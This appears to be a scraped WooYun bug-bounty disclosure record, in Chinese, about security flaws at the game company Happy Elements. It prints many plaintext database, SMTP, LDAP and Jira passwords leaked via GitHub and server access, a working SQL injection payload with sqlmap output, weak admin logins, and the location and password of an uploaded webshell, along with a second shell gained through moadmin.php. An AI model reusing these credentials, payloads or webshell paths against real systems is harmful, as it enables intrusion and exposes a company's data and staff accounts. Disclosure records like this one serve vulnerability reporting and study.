{"id": 65865, "wybug_id": "wooyun-2015-0143807", "wybug_title": "乐元素多处安全漏洞打包以及多个shell（数据可直接泄漏）", "wybug_corp": "happyelements.cn", "wybug_author": "mango", "wybug_date": "2015-09-29 11:24", "wybug_open_date": "2015-10-12 20:26", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：    女朋友非常喜欢玩开心消消乐~~还非常喜欢小黄鸡的抱枕~~~求送个~~~~ 详细说明：  先说说 github上面的信息泄露吧https://github.com/jiangkunwei/dc/blob/9778fb5f182a0dde6f36cf95bdfc8279eb74ec88/config/config.php\n),\t//mysql config\t'mysqlConfig' => array (\t\t'host' => 'da.happyelements.com',\t\t'dbuser' => 'alex',\t\t'dbpass' => 'myanotherdatacenter',\t\t'dbname' => array (\t\t\t'diamond' => 'da_uiue',\t\t\t'stat' => 'stat',\n支持外联哦~\n\nhttps://github.com/gaitian/project/blob/97d02946eab3e3f18aeef6f97702eb9c0295748e/trunk/protected/config/params.php\n'CharSet' => 'UTF-8',\t\t//'Encoding' => 'BASE64',\t\t'SMTPAuth' => true,\t\t'SMTPSecure' => 'tls',\t\t'SMTPDebug' => 1,\t\t'Host' => 'smtp.office365.com',\t\t'Port' => '587',\t\t'Username' => 'it_admin@happyelements.com',\t\t'Password' => 'tlt1234$',\n\n\n再说个注入问题http://fansclub.happyelements.com:80/fans/qa.php 这个是开心消消乐APP里面的链接 是客服里面的常见问题Client-IP 存在注入哦\nsqlmap identified the following injection points with a total of 106 HTTP(s) requests:---Parameter: Client-IP #1* ((custom) HEADER)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: ' AND (SELECT * FROM (SELECT(SLEEP(5)))PLSm) AND 'wOlE'='wOlE---web server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0.12available databases [6]:[*] bb[*] community[*] fans[*] information_schema[*] mg[*] wx\n\n\n其中 还影响 http://ff.happyelements.com/index.php/admin/nodes admin 1234qwer!\n\n   漏洞证明：  来说说getshellhttp://admin.happyelements.net/blog/ 是wp模版 存在弱口令 admin 123456\n\n通过上传webshell获得权限http://admin.happyelements.net/blog/wp-content/uploads/2015/09/0.php 密码a\n\n在这 翻到一些数据哦\npeng.shan 111111            zhangli            123456            12345678            1234qwer!cacti admin 1qaz!@#$            111111            12345678            1234qwer!\n 这个基本上是管理员通用的密码咯还发现了ldap \ndefine(\"LDAP_SERVER\",\"10.130.130.10\");    //120.56\");define(\"LDAP_PORT\",389);define(\"AUTH_USER\",'hec\\ad_operator');define(\"AUTH_PASS\",'happy-fish_it123');define(\"BASE_DN\",\"OU=hec,DC=hec,DC=intra\");\n(\"odbc:Driver=FreeTDS;Server=10.130.150.171;Port=1433;Database=middata2015;Tds_version=7.0;Uid=sa;Pwd=sa;\");\n'url' => 'http://leave.happyelements.net/',\t'smtp' => array (\t\t'CharSet' => 'UTF-8',\t\t'Encoding' => 'BASE64',\t\t'SMTPAuth' => true,\t\t'SMTPSecure' => 'TLS',\t\t'Host' => 'mail.happyelements.com',\t\t'Port' => '587',\t\t'Username' => 'leave_admin',\t\t'Password' => '1234qwer!',\t),\n又发现帐号~~登陆一下试试\n\n\n\n\n\n\n\n\n\n 第二个shellhttp://fc.happyelements.com/ 是客服系统存在moadmin.php 之前就被爆两个命令执行\n\n\n\n成功shell下面是一些数据哦~\n'From'          => 'support_user@happyelements.com',        'FromName'      => 'SupportUser',        'Username'      => 'support_user@happyelements.com',        'Password'      => 'Hemail@2015',        'Host'          => 'smtp.office365.com',   'host'          => '10.20.53.15',    'user'          => 'jira_cc',    'pass'          => 'CC_to_Jira#',    'name'          => 'jiradb',    'charset'       => 'utf8',    'source'        => 'jira_us',return array (\t\t'jira_cn' => array(\t\t'host'          \t\t=> '50.22.154.190',\t\t'user'          \t\t=> 'gsp_fc_db',\t\t'pass'         \t \t\t=> 'gsp_fc_1234qwer!',\t\t'name'         \t \t\t=> 'jiradb',\t\t'charset'       \t\t=> 'utf8',\t\t'source'        \t\t=> 'jira_us',\t\t\t//key\t\t'api'           \t\t=> 'http://fc.happyelements.com/jira/api',\t\t\t\t'domain'        \t\t=> 'http://jira.us.happyelements.com:8888/rest/jconnect/service/issue/comment/',\t//绂忔澗鏂版敼鐨?\t\t\t\t'pay_log'       \t\t=> 'http://w9.fortuna.happyelements.com/getUserLastPayLog.jsp',    'api'           => 'http://fc.happyelements.com/jira/api',    'domain'        => 'http://jira.us.happyelements.com:8888',    'pay_log'       => 'http://w9.fortuna.happyelements.com/getUserLastPayLog.jsp',);*/    /*    'paopaocat' => array(        'username'  => 2202410931,        'passwd'    => 'ppmmp@2013',        'token'     => 'happyfishFC',        ),     */    'happyfish'  => array(        'username'  => 2506103974,        'passwd'    => 'happyfishmp2012',        'token'     => 'happyfishFC',    ),);    'server'            =>'http://jira.us.happyelements.com:8888/rpc/soap/jirasoapservice-v2?wsdl',    'username'          =>'fcuser1',    'password'          =>'1234qwer!',);define('UC_DBHOST', '10.130.100.101');define('UC_DBUSER', 'bbs_fish_tw');define('UC_DBPW', 'bbsfishtw');define('UC_DBNAME', 'bbs_tw');define('UC_DBCHARSET', 'utf8');define('UC_DBTABLEPRE', '`bbs_tw`.tw_ucenter_');define('UC_DBCONNECT', 0);define('UC_CHARSET', 'utf-8');define('UC_KEY', '4eW1V09726Mb06f3N2a5de3enbj0N137n7i2Q6lab6p6q4l9a3Z8P6X91984n89d');define('UC_API', 'http://bbs.hfish.tw/uc_server');define('UC_APPID', '1');define('UC_IP', '');define('UC_PPP', 20);\nsupport_user 可以登录的 我就不帖图片了~   修复方案：     求抱枕~~我送妹子~~~~~求抱枕砸死我~~~   版权声明：转载请注明来源 mango@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-12 20:26 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-29 11:25 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:48        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  最多5 rank，超过10rank，楼下直播吃屎。    \n     2015-09-29 11:28 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:399 漏洞数:89        | 什么狗屁爱，生活已乱套！人的一生中，...)\t\t \n  不是我，是他↓↓↓    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}